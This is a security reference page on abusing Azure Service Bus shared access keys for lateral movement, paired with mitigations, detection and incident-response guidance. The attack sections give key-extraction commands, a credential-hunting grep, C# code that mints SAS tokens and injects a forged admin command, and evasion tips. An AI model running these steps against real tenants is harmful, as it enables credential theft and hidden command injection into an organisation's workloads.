# [LM-AUTH-038]: Service Bus Shared Access Key

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-038 |
| **Technique Name** | Service Bus Shared Access Key |
| **File Path** | 07_Lateral/LM-AUTH-038_ServiceBus.md |
| **MITRE ATT&CK v18.1** | T1550 – Use Alternate Authentication Material |
| **Tactic** | Lateral Movement |
| **Platforms** | Entra ID, Azure Service Bus (PaaS), Azure workloads consuming Service Bus |
| **Severity** | High |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Azure Service Bus Standard/Premium namespaces; .NET/Java/Node.js SDKs using SAS authentication |
| **Patched In** | N/A – architectural/operational risk, mitigated via Entra ID auth and key hygiene, not a patch |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

- **Concept:**
  This technique abuses **Azure Service Bus Shared Access Authorization Rules** and their **shared access keys** to perform lateral movement between workloads that consume or produce messages on a namespace. Service Bus SAS keys are long‑lived, base64‑encoded symmetric secrets associated with policies (for example, `RootManageSharedAccessKey` or custom rules) that grant `Send`, `Listen`, or `Manage` rights at namespace or entity scope. If an attacker obtains one of these keys (from code, CI/CD variables, Key Vault, a compromised VM, or developer workstation), they can generate Shared Access Signature (SAS) tokens and impersonate any trusted producer or consumer tied to that policy, gaining indirect access to downstream systems that trust messages or commands on those queues/topics.[3][6][12][15]

- **Attack Surface:**
  Azure **Service Bus namespace authorization rules and shared access keys**, consuming microservices, Functions, Logic Apps, and integration pipelines that **trust messages from Service Bus** as authenticated control/data inputs.

- **Business Impact:**
  **Lateral compromise of workloads and business processes** that are orchestrated over Service Bus, including replay or injection of commands, exfiltration of messages, workflow manipulation, and disruption of critical integration paths (for example, billing, identity workflows, provisioning, order processing). Misuse of `Manage` keys enables complete namespace takeover and message tampering.[3][12][15]

- **Technical Context:**
  Exploitation is low‑complexity once a key is obtained: generating SAS tokens is well‑documented and supported by SDKs. The activity is often executed via legitimate SDK calls over HTTPS and can blend with normal traffic unless correlated with **unusual source principals, IPs, or access patterns**. Primary indicators include **access from non‑expected principals/locations**, unexpected `Manage` operations, or anomalous throughput patterns. There is no single Event ID; visibility relies on **Azure diagnostics, Activity logs and Sentinel**.[3][12][15]

### Operational Risk

- **Execution Risk:** High – misuse of `Manage` or `Send`/`Listen` keys can impact multiple downstream systems simultaneously and is difficult to quickly roll back once messages have been processed.
- **Stealth:** Medium/High – actions use standard Service Bus APIs over HTTPS; without strong logging and analytics, malicious use of a stolen key is hard to distinguish from legitimate automation.
- **Reversibility:** Partial – keys and SAS tokens can be revoked by rotating keys and deleting/re‑scoping policies, but any **side‑effects on downstream systems (data processed, commands executed)** may be irreversible.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Azure 1.4 – 3.1, 3.2 | Secure management of secrets, use of managed identities instead of long‑lived keys for PaaS messaging. |
| **DISA STIG** | APP3560 / APP3550 (conceptual) | Application use of strong authentication and least privilege for external services. |
| **CISA SCuBA** | SCB‑AZ‑IA‑1, SCB‑AZ‑IA‑3 | Use identity‑based auth instead of static keys; enforce least‑privilege access for cloud messaging. |
| **NIST 800‑53** | AC‑3, AC‑6, IA‑5, SC‑12 | Access enforcement, least privilege, credential management and key protection for messaging fabrics. |
| **GDPR** | Art. 32 | Integrity and confidentiality of processing; compromise of message bus may expose personal data. |
| **DORA** | Art. 9, 10 | ICT security, dependency and third‑party risk – compromise of integration bus impacts critical services. |
| **NIS2** | Art. 21 | Technical measures for access control, secure communications, and incident handling in essential services. |
| **ISO 27001** | A.9.2.3, A.10.1, A.12.6 | Management of privileged access, cryptographic controls, mitigation of technical vulnerabilities. |
| **ISO 27005** | Risk Scenario | "Compromise of cloud message bus enables unauthorized commands and data exfiltration across services." |

---

## 5. DETAILED EXECUTION METHODS AND THEIRS STEPS

### METHOD 1 – Using a Stolen Namespace‑Level Shared Access Key from a Compromised Workload

**Supported Versions:** Azure Service Bus Standard/Premium, all current SDKs (.NET, Java, Node.js, Python) using SAS.

#### Step 1: Identify and Extract Service Bus Shared Access Key

**Objective:** Locate a Service Bus **Shared Access Authorization Rule** key that grants `Send`, `Listen` or `Manage` rights on a namespace or entity.

**Version Note:** Key handling is consistent across Service Bus versions; differences are mostly in management UI/SDKs, not in the key format.[3][6][12]

**Commands (examples):**

PowerShell (run on compromised admin/dev workstation or runbook that has `Microsoft.ServiceBus/namespaces/authorizationRules/listKeys/action`):

```powershell
# List authorization rules on a namespace
Get-AzServiceBusAuthorizationRule -ResourceGroupName "RG" -Namespace "sb-prod" |
  Select-Object Name, Rights

# Retrieve keys for a specific rule (for example, RootManageSharedAccessKey)
$keys = Get-AzServiceBusKey -ResourceGroupName "RG" -Namespace "sb-prod" `
  -Name "RootManageSharedAccessKey"
$keys.PrimaryKey
$keys.SecondaryKey
```

Azure CLI (if attacker has CLI access with appropriate RBAC):

```bash
az servicebus namespace authorization-rule keys list \
  --resource-group RG \
  --namespace-name sb-prod \
  --name RootManageSharedAccessKey \
  --query "primaryKey" -o tsv
```

**Expected Output:**

- Base64‑encoded `PrimaryKey` and/or `SecondaryKey` values.

**What This Means:**

- Possession of a `Manage` key at namespace scope allows **full control** over queues, topics and subscriptions, including send, receive and configuration operations.[3][12]

**OpSec & Evasion:**

- Prefer harvesting keys from **local config files, application settings, build logs, or environment variables** instead of direct ARM API calls to avoid noisy management operations.
- Exfiltrate only the minimum necessary key; avoid listing all rules where possible.

**Troubleshooting:**

- **Error:** `AuthorizationFailed` when calling `Get-AzServiceBusKey`.
  - **Cause:** Current principal lacks `listKeys` permission for that namespace.
  - **Fix (All Azure generations):** Escalate via separate privilege escalation chain (for example, misconfigured RBAC) to an identity with `Owner`/`Contributor` or explicit `listKeys` action on the namespace.

**References & Proofs:**

- Microsoft – "Service Bus access control with Shared Access Signatures".[3][6][12]
- Microsoft – "Azure Service Bus authentication and authorization".[15]

---

#### Step 2: Generate a SAS Token with the Stolen Key

**Objective:** Use the shared access key to create a **Shared Access Signature (SAS)** token that can authenticate to Service Bus as the target authorization rule.

**Version Note:** Token format is stable; SDK helper methods differ slightly per language.[3][6][12]

**Command (.NET example):**

```csharp
var policyName = "RootManageSharedAccessKey";
var key = "<stolen-base64-key>";
var uri = new Uri("sb://sb-prod.servicebus.windows.net/myqueue");

var tokenProvider = 
    Microsoft.Azure.ServiceBus.Primitives.TokenProvider
        .CreateSharedAccessSignatureTokenProvider(policyName, key);

var token = await tokenProvider.GetTokenAsync(uri.AbsoluteUri, TimeSpan.FromHours(1));
Console.WriteLine(token.TokenValue);
```

**Expected Output:**

- A SAS token string beginning with `SharedAccessSignature sr=...&sig=...&se=...&skn=...`.

**What This Means:**

- The attacker now has a bearer token that can be used on HTTP/AMQP connections to impersonate the original workload, within the scope and expiry of the token.[3][12]

**OpSec & Evasion:**

- Use **short‑lived tokens** aligned with attack window to reduce forensic visibility beyond the campaign.
- Generate tokens **client‑side**; avoid ARM actions that could appear suspicious in Activity Logs.

**Troubleshooting:**

- **Error:** `401 Unauthorized` when using SAS.
  - **Cause:** Incorrect URI in `sr`, expired `se` timestamp, or wrong rule name `skn`.
  - **Fix:** Regenerate SAS ensuring that the `sr` matches exact queue/topic URI and that local clock skew is minimal.

**References & Proofs:**

- Microsoft Docs – Service Bus SAS format and usage.[3][6][12]

---

#### Step 3: Use SAS Token to Perform Lateral Movement via Messages

**Objective:** Connect to the target queue/topic using the SAS token and push or read messages to pivot into other workloads.

**Command (.NET receiver example – `Listen` right):**

```csharp
var connectionString =
  "Endpoint=sb://sb-prod.servicebus.windows.net/;" +
  "SharedAccessKeyName=RootManageSharedAccessKey;" +
  "SharedAccessKey=<stolen-base64-key>;";

var client = new QueueClient(connectionString, "myqueue", ReceiveMode.PeekLock);
client.RegisterMessageHandler(async (msg, ct) =>
{
    var body = Encoding.UTF8.GetString(msg.Body);
    Console.WriteLine($"[+] Received: {body}");
    await client.CompleteAsync(msg.SystemProperties.LockToken);
}, new MessageHandlerOptions(ExceptionReceivedHandler) { MaxConcurrentCalls = 5, AutoComplete = false });
```

**Command (.NET sender example – `Send` right):**

```csharp
var messageBody = "{ \"action\": \"AddAdminUser\", \"target\": \"app-prod\" }";
var msg = new Message(Encoding.UTF8.GetBytes(messageBody))
{
    ContentType = "application/json",
    Label = "control-command"
};

await client.SendAsync(msg);
```

**Expected Output:**

- Successful receipt and/or delivery of messages indistinguishable from legitimate producers.

**What This Means:**

- Any downstream **Functions, Logic Apps, workers, or microservices** that treat Service Bus as a **trusted command bus** will execute or act on malicious content, enabling lateral movement into those environments.

**OpSec & Evasion:**

- Mimic **normal message shapes, labels and frequency** to avoid anomaly‑based detection.
- Reuse existing queues/topics that already carry similar traffic (for example, provisioning or workflow queues).

**Troubleshooting:**

- **Error:** Messages ignored by downstream systems.
  - **Cause:** Schema validation or application‑level authentication/authorization on message content.
  - **Fix:** Reverse‑engineer message schema from captured traffic; replicate required claims/headers.

**References & Proofs:**

- Azure Service Bus SDK documentation and samples for authorized clients.[3][12][15]

---

### METHOD 2 – Abusing Over‑Privileged Entity‑Scoped Keys for Targeted Pivot

**Supported Versions:** All Azure Service Bus tiers supporting entity‑scoped authorization rules.

#### Step 1: Harvest Entity‑Level Keys from Application Configuration

**Objective:** Extract **queue‑ or topic‑scoped** SAS keys from application configuration (for example, `appsettings.json`, Key Vault references, CI/CD variables).

**Command (example – search on compromised host):**

```bash
grep -R "Endpoint=sb://" /var/www /app /opt -n 2>/dev/null
```

Typical connection string format:

```text
Endpoint=sb://sb-prod.servicebus.windows.net/;
SharedAccessKeyName=app-worker-send;
SharedAccessKey=<base64-key>;
EntityPath=orders-queue
```

**Expected Output:**

- One or more hard‑coded or injected Service Bus connection strings.

**What This Means:**

- Even without namespace‑level `Manage` rights, an attacker can fully impersonate message flows for the specific entity, which can be enough to compromise associated workflows and identities.

**OpSec & Evasion:**

- Prefer **read‑only (`Listen`) keys** if goal is reconnaissance, and `Send` keys for subtle command injection; avoid touching `Manage` unless necessary.

**Troubleshooting:**

- **Issue:** Connection string appears, but queue doesn’t exist.
  - **Cause:** Legacy configuration or renamed entities.
  - **Fix:** Enumerate current entities via `Manage` key if available; otherwise, test connectivity and handle 404 errors gracefully.

**References & Proofs:**

- Microsoft guidance warning against storing SAS/keys in plain text and recommending Entra ID auth.[3][12][15]

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL – Move from SAS Keys to Entra ID‑Based Authentication

**Action 1:** Replace Service Bus SAS key authentication with **Microsoft Entra ID (OAuth 2.0)–based access control** for applications wherever feasible.

**Applies To Versions:** All Azure Service Bus namespaces that support Entra ID authorization.[3][12][15]

**Manual Steps (Portal – high level):**

1. Go to **Azure Portal → Service Bus → Your Namespace**.
2. Under **Settings**, open **Shared access policies** and review dependencies.
3. For each critical app:
   - Register an **app registration** in **Entra ID**.
   - Grant the app the appropriate **Service Bus Data Sender/Receiver/Owner** RBAC roles on the namespace or specific queues/topics.
4. Update application configuration to use **Entra ID credentials** (managed identity or client credentials) and remove usage of SAS keys.
5. After all apps are migrated and validated, **remove or restrict legacy SAS policies**, especially `RootManageSharedAccessKey`.[3][12][15]

**Manual Steps (PowerShell – concept):**

```powershell
# Assign Service Bus Data Sender role to a managed identity
$sp = Get-AzADServicePrincipal -DisplayName "app-prod-worker"
New-AzRoleAssignment -ObjectId $sp.Id `
  -RoleDefinitionName "Azure Service Bus Data Sender" `
  -Scope "/subscriptions/<sub>/resourceGroups/RG/providers/Microsoft.ServiceBus/namespaces/sb-prod"
```

---

**Action 2:** Enforce Strict Least‑Privilege on Authorization Rules

**Manual Steps (Portal):**

1. For each namespace, open **Shared access policies**.
2. Eliminate broad `Manage` policies where not strictly required; prefer **entity‑scoped rules** with only `Send` or `Listen` rights.
3. Ensure no consumer application holds both `Send` and `Listen` unless functionally necessary.

**Manual Steps (ARM / PowerShell):**

- Use IaC (ARM/Bicep/Terraform) to **define minimal‑scope rules** and prevent drift.

---

### Priority 2: HIGH – Secure Storage and Rotation of Keys

**Action:** Store any remaining keys in **Azure Key Vault**, rotate regularly, and monitor usage.

**Manual Steps (Key Vault):**

1. Create or select a **Key Vault**.
2. Add Service Bus keys as **secrets**; configure **Key Rotation** policies aligned to risk (for example, 30–60 days).
3. Replace hard‑coded connection strings with **Key Vault references** (Functions, App Service, Logic Apps) or `DefaultAzureCredential` patterns to avoid handling secrets directly.[7][10][13][14]

**Validation Command (Verify Fix):**

```bash
# Example: verify no Service Bus connection strings present in code repo
rg "Endpoint=sb://" . -g
```

**Expected Output (If Secure):**

- No plaintext Service Bus connection strings in repositories or app configuration files; usage is via managed identity or Key Vault references.

**What to Look For:**

- Any remaining `Endpoint=sb://` or `SharedAccessKey=` patterns should be investigated and remediated.

---

### Access Control & Policy Hardening

**Conditional Access:**

- Apply **Conditional Access** to identities that can `listKeys` or manage Service Bus, restricting access by device compliance, location, and strong MFA.

**RBAC/ABAC:**

- Narrow RBAC to ensure only a **minimal set of operational identities** can manage or read Service Bus keys.
- Use **separate identities** for deployment and runtime to limit blast radius.

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Service Bus:**
  - Unusual spikes in `IncomingRequests`, `OutgoingRequests`, or `ServerErrors` metrics without corresponding deployment changes.
  - Creation of new shared access policies with broad rights, or frequent key regeneration events.
- **Azure Activity Logs:**
  - `listKeys` operations on Service Bus namespaces from unexpected principals or locations.
- **Network/Access:**
  - Service Bus access originating from **unusual IP ranges**, tenants, or user agents compared to baseline.

### Forensic Artifacts

- **Cloud Logs:**
  - **Azure Activity Logs** for `Microsoft.ServiceBus/namespaces/authorizationRules/*` operations.[12][15]
  - Service Bus diagnostic logs (if enabled) showing connection attempts and errors.
- **Application Logs:**
  - Unexpected failures in clients after forced key rotation (indicating possible abuse of old keys).

### Response Procedures

1. **Containment – Rotate and Scope Keys**
   - Immediately **regenerate Service Bus keys** for affected policies and, where possible, delete or reduce their scope.
   - If Entra ID auth is available, **disable SAS policies** after confirming all legitimate dependencies are updated.

2. **Evidence Collection**
   - Export Activity Logs and Service Bus diagnostics for the suspected window.
   - Correlate `listKeys`, `RegenerateKeys`, and abnormal connection patterns with identities and IPs.

3. **Eradication and Hardening**
   - Migrate remaining applications from SAS keys to **Entra ID‑based access**.
   - Implement CI/CD checks to **block introduction of new SAS‑based connection strings** into code or configuration.

4. **Recovery and Monitoring**
   - Validate downstream workloads for signs of **malicious messages or replayed commands**.
   - Deploy or refine **Sentinel analytics** tracking Service Bus management operations and anomalous usage.

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | IA‑PHISH‑001 – Device code phishing attacks | Compromise cloud identity used to manage or deploy Service Bus–backed workloads. |
| **2** | **Privilege Escalation** | PE‑VALID‑010 – Azure Role Assignment Abuse | Escalate to a role that can `listKeys` on Service Bus namespaces. |
| **3** | **Current Step** | **LM‑AUTH‑038 – Service Bus Shared Access Key** | Use stolen keys to pivot via Service Bus queues/topics into connected workloads. |
| **4** | **Persistence** | PERSIST‑SERVER‑003 – Azure Function Backdoor | Deploy or modify Functions triggered by Service Bus queues to maintain long‑term presence. |
| **5** | **Impact** | COLLECT‑DATA‑001 – Azure Blob Storage Data Exfiltration | Exfiltrate or manipulate data processed as a result of compromised Service Bus message flows. |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: Misuse of SAS‑Style Keys in Cloud Messaging Environments

- **Target:** Cloud‑native applications integrating multiple microservices over message buses and storage accounts.
- **Timeline:** 2023–2025 – multiple disclosed cases of long‑lived SAS or shared keys enabling lateral movement across Azure workloads.[5][8][11][14][17]
- **Technique Status:** Active – While Microsoft recommends **Entra ID‑based authorization** for Service Bus and Storage, many environments continue to rely on long‑lived SAS/keys, leaving this lateral movement path viable.[3][7][10][12][15]
- **Impact:** Attackers able to use exposed keys/SAS tokens from code repositories, logs, or misconfigured public endpoints to gain read/write access to messaging and storage backends, pivoting into Functions, Logic Apps, and other PaaS components that trust those resources as secure inputs.[5][8][11][14][17]
- **Reference:** Microsoft Service Bus and Storage security guidance, plus public analyses of SAS/token abuse and lateral movement in Azure PaaS.

### Example 2: Storage and Function App Lateral Movement Analogy

- **Target:** Azure Storage + Function App architectures using storage triggers and shared keys.
- **Timeline:** 2023–2024 – documented exploit chains where storage access via Shared Key or SAS tokens allowed attackers to overwrite Function code and exfiltrate higher‑privileged managed identities, enabling lateral movement.[5][8][14][17]
- **Technique Status:** Demonstrates a parallel pattern: **control‑plane secret → data/control bus compromise → privilege escalation/lateral movement**, directly analogous to Service Bus key abuse.
- **Impact:** Function app takeover, token theft, cross‑resource movement and eventual access to crown‑jewel data or admin interfaces.
- **Reference:** Public research on Azure Storage Shared Key/Function abuse and SAS token risks in lateral movement chains.

---